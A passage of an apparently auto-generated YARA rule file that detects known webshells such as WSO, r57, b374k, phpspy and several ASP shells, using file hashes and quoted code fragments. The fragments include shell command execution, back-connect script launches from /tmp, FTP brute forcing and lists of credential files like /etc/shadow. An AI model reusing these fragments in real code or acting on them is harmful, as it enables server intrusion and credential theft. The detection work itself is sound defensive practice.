      $s8 = "header(\"Content-disposition: attachment; filename=\\\"\".basename($s_dlthis).\"\\\";\");" fullword ascii
      $s9 = "if($s_i_buff=trim(@file_get_contents(\"/proc/meminfo\"))){" fullword ascii
      $s10 = "if($s_t = @file_get_contents($s_u)){" fullword ascii
      $s11 = "$s_sffcontent = @file_get_contents($s_a);" fullword ascii
      $s12 = "header(\"Content-length: \".@filesize($s_dlthis));" fullword ascii
      $s13 = "$s_dlfile = get_archiver_available();" fullword ascii
      $s14 = "var b = d.getElementsByName('abox');" fullword ascii
      $s15 = "$s_arc = get_archiver_available();" fullword ascii
      $s16 = "$s_dlname=basename(getcwd());" fullword ascii
      $s17 = "var c = d.getElementsByName('abox');" fullword ascii
      $s18 = "$s_dlfile .= \"<form action='\".$s_self.\"' method='post'>" fullword ascii
      $s19 = "var b = d.getElementById('massact');" fullword ascii
      $s20 = "var a = d.getElementsByName('cbox');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _icesword_111_85 {
   meta:
      description = "webshell - from files icesword.aspx, 111.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
      hash2 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
   strings:
      $x1 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $s2 = " : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownList runat=\"ser" ascii
      $s3 = ".4.0;Data Source=E:\\database.mdb\">ACCESS</asp:ListItem></asp:DropDownList><asp:Button ID=\"QcZPA\" runat=\"server\" Text=\"Go" ascii
      $s4 = ".Bin_Style_Login{font-size: 12px; font-family:Tahoma;background-color:#ddd;border:1px solid #fff;}" fullword ascii
      $s5 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">" fullword ascii
      $s6 = ":','\"+AXSbb.Value.Replace(@\"\\\",@\"\\\\\")+Bin_Files.Name.Replace(\"'\",\"\\\\'\")+\"');if(filename){Bin_PostBack('Bin_CFile" ascii
      $s7 = " /c net user\"/> <asp:Button ID=\"SPhc\" CssClass=\"bt\" runat=\"server\" Text=\"" fullword ascii
      $s8 = "ZGKh.Text=\"<a href=\\\"javascript:if(confirm('" fullword ascii
      $s9 = "\" OnClick=\"Ybg\"></asp:LinkButton> | <asp:LinkButton ID=\"xxzE\" runat=\"server\" Text=\"Cmd" fullword ascii
      $s10 = ":','\"+AXSbb.Value.Replace(@\"\\\",@\"\\\\\")+Bin_Files.Name.Replace(\"'\",\"\\\\'\")+\"');if(filename){Bin_PostBack('Bin_CFile" ascii
      $s11 = ") ?')){Bin_PostBack('kRXgt','\"+MVVJ(AXSbb.Value+Bin_folder.Name)+\"')};\\\">" fullword ascii
      $s12 = ":','\"+AXSbb.Value.Replace(@\"\\\",@\"\\\\\")+Bin_folder.Name.Replace(\"'\",\"\\\\'\")+\"');if(filename){Bin_PostBack('dAJTD\"+M" ascii
      $s13 = ":','\"+AXSbb.Value.Replace(@\"\\\",@\"\\\\\")+Bin_Files.Name.Replace(\"'\",\"\\\\'\")+\"');if(filename){Bin_PostBack('Tlvz\"+MVV" ascii
      $s14 = ":','\"+AXSbb.Value.Replace(@\"\\\",@\"\\\\\")+Bin_Files.Name.Replace(\"'\",\"\\\\'\")+\"');if(filename){Bin_PostBack('Tlvz\"+MVV" ascii
      $s15 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('cYAl','\"+Bin_Files.Name+\"')\\\">" fullword ascii
      $s16 = ":','\"+AXSbb.Value.Replace(@\"\\\",@\"\\\\\")+Bin_folder.Name.Replace(\"'\",\"\\\\'\")+\"');if(filename){Bin_PostBack('dAJTD\"+M" ascii
      $s17 = "?')){Bin_PostBack('hae','');};\";" fullword ascii
      $s18 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('Bin_Editfile','\"+Bin_Files.Name+\"')\\\">" fullword ascii
      $s19 = "r=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB\">MSSQL</asp:ListItem><asp:ListItem Value=\"Provider=Microsoft.Jet.OLE" ascii
      $s20 = "\" OnClick=\"mcCY\"></asp:LinkButton> | <a href=\"#\" id=\"Bin_Button_CreateDir\" runat=\"server\">" fullword ascii
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _2014__2013____1__86 {
   meta:
      description = "webshell - from files 2014.asp, .asp, 2013.asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash2 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash3 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash4 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash5 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "RaPath=ExecuteGlobal(s)" fullword ascii
      $s2 = "set f=fso.GetFile(ScriptPath)" fullword ascii
      $s3 = "endN = Right(tmp(i), Len(tmp(i)) - seekx )" fullword ascii
      $s4 = "startN = Left(tmp(i), seekx - 1 )" fullword ascii
      $s5 = "j\"<hr>Process in \"&thetime&\" s\"" fullword ascii
      $s6 = "Server.CreateObject(CONST_FSO).CreateFolder(Left(thePath, i - 1))" fullword ascii
      $s7 = "executeglobal theFolder" fullword ascii
      $s8 = "j\"<br>Port List:\"" fullword ascii
      $s9 = "j\"<script>function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(\"\"" fullword ascii
      $s10 = "domain=Request.ServerVariables(\"http_host\")" fullword ascii
      $s11 = "j(targetip & \":\" & portNum & \".........<font color=red>" fullword ascii
      $s12 = "if (CheckNextDir=True) and (IS_TEMP_DIR=false) then " fullword ascii
      $s13 = "backgroundColor='#191919'\"\" style='border:1px solid #dddddd;padding-bottom:4px' id=d><a href='javascript:ShowFolder(\"\"\"&ReP" ascii
      $s14 = "tmp = Split(request.Form(\"port\"),\",\")" fullword ascii
      $s15 = "si=si&\"<br>\"&F.Name&\"</a><br><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\",\"\"CopyFolder\"\")'  oncl" ascii
      $s16 = "SI=SI&\"<td  height=10 width=17% align=center><div  onMouseOver=\"\"this.style.backgroundColor='#B3D169'\"\" onMouseOut=\"\"this" ascii
      $s17 = "ScriptPath=Server.MapPath(Request.ServerVariables(\"SCRIPT_NAME\"))" fullword ascii
      $s18 = "if Right(path,1) <> \"\\\" then GetFullPath = path&\"\\\" " fullword ascii
      $s19 = "j\"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>\"" fullword ascii
      $s20 = "j\"<center><br><form name='form1' method='post' action=''><table width='500'><tr align='center' valign='middle'><td colspan='2' " ascii
   condition:
      ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_r57_87 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash5 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash6 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $x1 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $s2 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))));" fullword ascii
      $s3 = "    compress($filename,$filedump,$_POST['compress']);" fullword ascii
      $s4 = "function compress(&$filename,&$filedump,$compress)" fullword ascii
      $s5 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"edit_file\" && !empty($_POST['e_name']))" fullword ascii
      $s6 = " $headers .= chunk_split(base64_encode($attach['content'])).\"\\r\\n\";" fullword ascii
      $s7 = " $_POST['cmd'] = \"\";" fullword ascii
      $s8 = "if ($_POST['cmd']==\"ftp_brute\")" fullword ascii
      $s9 = " $headers .= \"Content-Type: \".$attach['type'];" fullword ascii
      $s10 = "]):(\"/ftp-dir/file\"))).in('hidden','cmd',0,'ftp_file_down'));" fullword ascii
      $s11 = " $headers .= \"Content-Transfer-Encoding: base64\\r\\n\\r\\n\";" fullword ascii
      $s12 = "]):(\"/ftp-dir/file\"))).in('hidden','cmd',0,'ftp_file_up'));" fullword ascii
      $s13 = "echo sr(15,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').i" ascii
      $s14 = "echo sr(15,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').i" ascii
      $s15 = "        $filedump = $zipfile -> file();" fullword ascii
      $s16 = "        $zipfile -> addFile($filedump, substr($filename, 0, -4));" fullword ascii
      $s17 = "  foreach($users as $user) { echo $user.\"<br>\"; }" fullword ascii
      $s18 = "        $filedump = bzcompress($filedump);" fullword ascii
      $s19 = " @ftp_close($connection);" fullword ascii
      $s20 = " $count = count($users);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_0_wso_4_2_1_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_88 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.0.php, wso-4.2.1.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "b4c76bead50773295dc09fc006ec5143c7aa3558db7c96cccddb8ab180f8d63b"
      hash4 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash5 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash6 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash7 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash8 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "                showSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s2 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"])) {" fullword ascii
      $s3 = " = shell_exec($in);" fullword ascii
      $s4 = " = ex(which(\"perl\").\" /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" &\");" fullword ascii
      $s5 = " = ex(which(\"perl\").\" /tmp/bp.pl \".$_POST['p2'].\" &\");" fullword ascii
      $s6 = " = md5($_SERVER['HTTP_USER_AGENT']);" fullword ascii
      $s7 = "function hardLogin() {" fullword ascii
      $s8 = "                foreach ($downloaders as $" fullword ascii
      $s9 = "if (!function_exists(\"posix_getpwuid\") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_" ascii
      $s10 = "            showSecParam('OS version', @file_get_contents('/proc/version'));" fullword ascii
      $s11 = "if (!function_exists(\"posix_getpwuid\") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_" ascii
      $s12 = " = ex(\"gcc -o /tmp/bp /tmp/bp.c\");" fullword ascii
      $s13 = "if (!function_exists(\"posix_getgrgid\") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_" ascii
      $s14 = "if (!function_exists(\"posix_getgrgid\") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_" ascii
      $s15 = " .= ex(\"/tmp/bc \".$_POST['p2'].\" \".$_POST['p3'].\" &\");" fullword ascii
      $s16 = "            showSecParam('Distr name', @file_get_contents('/etc/issue.net'));" fullword ascii
      $s17 = " = ex(\"gcc -o /tmp/bc /tmp/bc.c\");" fullword ascii
      $s18 = " .= ex(\"/tmp/bp \".$_POST['p2'].\" \".$_POST['p3'].\" &\");" fullword ascii
      $s19 = "    if(isset($_POST['pass']) && (md5($_POST['pass']) == $" fullword ascii
      $s20 = "        hardLogin();" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897_4_0__1__89 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, 4.0 (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
   strings:
      $s1 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s2 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s3 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s4 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s5 = "j\"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s6 = "j cdx&\"<a href='?Action=ProFile' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
      $s7 = "j cdx&\"<a href='http://tool.chinaz.com/Tools/Robot.aspx?url=\"&str1&\"&btn=+" fullword ascii
      $s8 = "SWODNIW" fullword ascii /* reversed goodware string 'WINDOWS' */
      $s9 = "margorP" fullword ascii /* reversed goodware string 'Program' */
      $s10 = "stnemucoD" fullword ascii /* reversed goodware string 'Documents' */
      $s11 = "si=\"<center><a></a><div style='width:400px;padding:32px; align=left'><br><form action='\"&url&\"' method='post'><input name='pa" ascii
      $s12 = "Set fsoXX = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s13 = "\"\"><br>\"&F.Name&\"</a><br><a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\",\"\"CopyFolder\"\")'  onclick" ascii
      $s14 = "si=si&\"<a href='javascript:ShowFolder(\"\"\"&RePath(Path&\"\\\"&F.Name)&\"\"\")' title=\"\"" fullword ascii
      $s15 = "(redloFwohS:tpircsavaj'=ferh ma=ssalc  a<;psbn&;psbn&;psbn&;psbn&;psbn&;psbn&>a<" fullword ascii
      $s16 = "(redloFwohS:tpircsavaj'=ferh ma=ssalc a<;psbn&;psbn&;psbn&;psbn&>a<" fullword ascii
      $s17 = "(redloFwohS:tpircsavaj'=ferh ma=ssalc  a<>a<" fullword ascii
      $s18 = ">'retnec'=ngila '06'=htdiw dt<>rt<>'tnerap_'=tegrat '" fullword ascii
      $s19 = "(redloFwohS:tpircsavaj'=ferh ma=ssalc a<;psbn&;psbn&;psbn&>a<" fullword ascii
      $s20 = "(redloFwohS:tpircsavaj'=ferh ma=ssalc a<;psbn&>a<" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_90 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash6 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash7 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash8 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash9 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash10 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "if((@$_POST['p2']=='download') && (@$_POST['p1']!='select')) {" fullword ascii
      $s2 = "echo '</form></div><script>d.cf.cmd.focus();</script>';" fullword ascii
      $s3 = "$res = @mysql_connect($ip.':'.($port?$port:3306), $login, $pass);" fullword ascii
      $s4 = "t.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $s5 = "echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</f" ascii
      $s6 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.chmod.value);return" ascii
      $s7 = "alue=\\'\\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\\'\\'" ascii
      $s8 = "if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {" fullword ascii
      $s9 = "echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</f" ascii
      $s10 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.touch.value);return" ascii
      $s11 = "elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))" fullword ascii
      $s12 = " 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i]))," fullword ascii
      $s13 = "if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))" fullword ascii
      $s14 = "echo '<h1>Console</h1><div class=content><form name=cf onsubmit=\"if(d.cf.cmd.value==\\'clear\\'){d.cf.output.value=\\'\\';d.cf." ascii
      $s15 = "$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);" fullword ascii
      $s16 = "$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';" fullword ascii
      $s17 = "echo \"d.cf.cmd.value='';\\n\";" fullword ascii
      $s18 = "if( @is_readable($_POST['p1']) ) {" fullword ascii
      $s19 = "if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {" fullword ascii
      $s20 = "echo \"d.cf.output.value+='\".$temp.\"';\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpspy_2005_full_PHPSPY_91 {
   meta:
      description = "webshell - from files phpspy_2005_full.php, PHPSPY.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash2 = "54bdd255c812288be22598090c1417b2d5d8c3558086c84150d7a62303352b2e"
   strings:
      $s1 = "$info[37] = array(\"FTP\",getfun(\"ftp_login\"));" fullword ascii
      $s2 = "\",\"<a href=\\\"http://$_SERVER[SERVER_NAME]\\\" target=\\\"_blank\\\">$_SERVER[SERVER_NAME]</a>\");" fullword ascii
      $s3 = "\",getfun(\"OCILogOff\"));" fullword ascii
      $s4 = " display_errors\",getphpcfg(\"display_errors\"));" fullword ascii
      $s5 = "\",getfun(\"session_start\"));" fullword ascii
      $s6 = "/*------- cookie " fullword ascii
      $s7 = "/*------- session " fullword ascii
      $s8 = "\",getfun(\"pdf_close\"));" fullword ascii
      $s9 = "\",getfun(\"mysql_close\"));" fullword ascii
      $s10 = "(Zlib)\",getfun(\"gzclose\"));" fullword ascii
      $s11 = "\",getfun(\"pg_close\"));" fullword ascii
      $s12 = " memory_limit\",getphpcfg(\"memory_limit\"));" fullword ascii
      $s13 = "$info[33] = array(\"Postgre SQL" fullword ascii
      $s14 = "\",getfun(\"ora_close\"));" fullword ascii
      $s15 = "$info[17] = array(\"magic_quotes_gpc\",getphpcfg(\"magic_quotes_gpc\"));" fullword ascii
      $s16 = " GD Library\",getfun(\"imageline\"));" fullword ascii
      $s17 = " register_globals\",getphpcfg(\"register_globals\"));" fullword ascii
      $s18 = "\",getfun(\"snmpget\"));" fullword ascii
      $s19 = "\",getfun(\"fsockopen\"));" fullword ascii
      $s20 = "\",getfun(\"xml_set_object\"));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_2_5_source_b374k_2_6_source_92 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-2.5.source.php, b374k-2.6.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash3 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
   strings:
      $s1 = "<?php if(isset($_REQUEST['login'])) echo \"if(d.getElementById('login')) d.getElementById('login').focus();\"; ?>" fullword ascii
      $s2 = "setcookie(\"s_java\", $s_java ,time() + $s_login_time);" fullword ascii
      $s3 = "setcookie(\"s_perl\", $s_perl ,time() + $s_login_time);" fullword ascii
      $s4 = "setcookie(\"s_ruby\", $s_ruby ,time() + $s_login_time);" fullword ascii
      $s5 = "setcookie(\"s_gcc\", $s_gcc ,time() + $s_login_time);" fullword ascii
      $s6 = "setcookie(\"s_tar\", $s_tar ,time() + $s_login_time);" fullword ascii
      $s7 = "setcookie(\"s_python\", $s_python ,time() + $s_login_time);" fullword ascii
      $s8 = "if(function_exists('oci_parse') && function_exists('oci_execute')){" fullword ascii
      $s9 = "<div id='content' id='box_shell'>" fullword ascii
      $s10 = "<?php if(isset($_REQUEST['cmd'])) echo \"if(d.getElementById('cmd')) d.getElementById('cmd').focus();\"; ?>" fullword ascii
      $s11 = "\"/etc/passwd\", \"/etc/shadow\", \"/etc/group\", \"/etc/issue\", \"/etc/motd\", \"/etc/sudoers\", \"/etc/hosts\", \"/etc/aliase" ascii
      $s12 = "\"/etc/passwd\", \"/etc/shadow\", \"/etc/group\", \"/etc/issue\", \"/etc/motd\", \"/etc/sudoers\", \"/etc/hosts\", \"/etc/aliase" ascii
      $s13 = "// which command" fullword ascii
      $s14 = "<a href=\\\"javascript:tukar('titik2','titik2_form');\\\" title='create new directory'>+dir</a>" fullword ascii
      $s15 = "<a href=\\\"javascript:tukar('titik1','titik1_form');\\\" title='create new directory'>+dir</a>" fullword ascii
      $s16 = "\"/etc/httpd/conf/httpd.conf\", \"/usr/local/apache2/conf/httpd.conf\",\" /etc/apache2/apache2.conf\", \"/etc/apache2/httpd.conf" ascii
      $s17 = "\"/etc/httpd/conf/httpd.conf\", \"/usr/local/apache2/conf/httpd.conf\",\" /etc/apache2/apache2.conf\", \"/etc/apache2/httpd.conf" ascii
      $s18 = "<?php if(isset($_REQUEST['sqlcode'])) echo \"if(d.getElementById('sqlcode')) d.getElementById('sqlcode').focus();\"; ?>" fullword ascii
      $s19 = "<?php if(isset($_REQUEST['evalcode'])) echo \"if(d.getElementById('evalcode')) d.getElementById('evalcode').focus();\"; ?>" fullword ascii
      $s20 = "var b = d.getElementById('gccoption');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell_SnIpEr_SA_Shell_93 {
   meta:
      description = "webshell - from files r57shell.php, SnIpEr_SA Shell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash2 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
   strings:
      $s1 = "'ru_text87'=>'?????????? ?????? ? ?????????? ftp-???????'," fullword ascii
      $s2 = "'cmd'] = \"\"; }" fullword ascii
      $s3 = "/*  ???? ? ??? ???? ?????-???? ???? ?? ?????? ???? ????? ??????? ??????? ???????? ? ?????? ?? ??????" fullword ascii
      $s4 = "'eng_text5' =>'" fullword ascii
      $s5 = "iv></td></tr></table><table width=100%>';" fullword ascii
      $s6 = "'eng_text2' =>'" fullword ascii
      $s7 = "'eng_text1' =>'" fullword ascii
      $s8 = "'eng_text48'=>'" fullword ascii
      $s9 = "'eng_text72'=>'" fullword ascii
      $s10 = "'eng_text4' =>'" fullword ascii
      $s11 = "'eng_text32'=>'" fullword ascii
      $s12 = "'eng_butt3' =>'" fullword ascii
      $s13 = "'eng_text42'=>'" fullword ascii
      $s14 = "'eng_text80'=>'" fullword ascii
      $s15 = "'eng_butt1' =>'" fullword ascii
      $s16 = "'eng_text56'=>'" fullword ascii
      $s17 = "'eng_text54'=>'" fullword ascii
      $s18 = "'eng_text45'=>'" fullword ascii
      $s19 = "</td></tr></table><table width=100%>';" fullword ascii
      $s20 = "'eng_text37'=>'" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_2014_4_0__1___2013__2012____1__r00ts_94 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 2014.asp, 4.0 (1).asp, .asp, 2013.asp, _2012.asp, .asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash5 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash6 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash7 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash8 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash9 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash10 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash11 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "    If strFdName<>\"Config.Msi\" EQV strFdName<>\"RECYCLED\" EQV strFdName<>\"RECYCLER\" EQV strFdName<>\"System Volume Informat" ascii
      $s2 = "    If strFdName<>\"Config.Msi\" EQV strFdName<>\"RECYCLED\" EQV strFdName<>\"RECYCLER\" EQV strFdName<>\"System Volume Informat" ascii
      $s3 = "ument.xform.submit();}</script>\"" fullword ascii
      $s4 = " Private Function GetAllFile(Folder)" fullword ascii
      $s5 = "</b><input type=text name=U value=sa>&nbsp;<b id=x>Password" fullword ascii
